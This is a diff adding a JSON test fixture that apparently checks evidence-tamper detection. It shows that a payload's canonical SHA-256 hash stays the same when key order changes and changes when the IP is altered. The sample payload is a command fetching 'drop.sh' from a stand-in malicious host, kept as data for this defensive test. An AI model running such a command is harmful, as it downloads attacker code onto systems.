@@ -1,0 +1,21 @@
+{
+  "test_id": "M17-EVIDENCE-TAMPER-01",
+  "original_payload": {
+    "command": "curl http://malicious.evil/drop.sh",
+    "ip": "185.220.101.5"
+  },
+  "canonical_sha256": "4b68efd3e3ba3779e5fe9feff8544c0bb6dcf2b97c5e27a7cba8b29dfcbcfd3f",
+  "reordered_payload": {
+    "ip": "185.220.101.5",
+    "command": "curl http://malicious.evil/drop.sh"
+  },
+  "reordered_canonical_sha256": "4b68efd3e3ba3779e5fe9feff8544c0bb6dcf2b97c5e27a7cba8b29dfcbcfd3f",
+  "key_order_invariant": true,
+  "tampered_payload": {
+    "command": "curl http://malicious.evil/drop.sh",
+    "ip": "185.220.101.6"
+  },
+  "tampered_canonical_sha256": "f5fbf67fc5790aee6942095368a2bfcaec83b5443fa5e9668352ce8a13a0c710",
+  "tamper_detected": true
+}
+
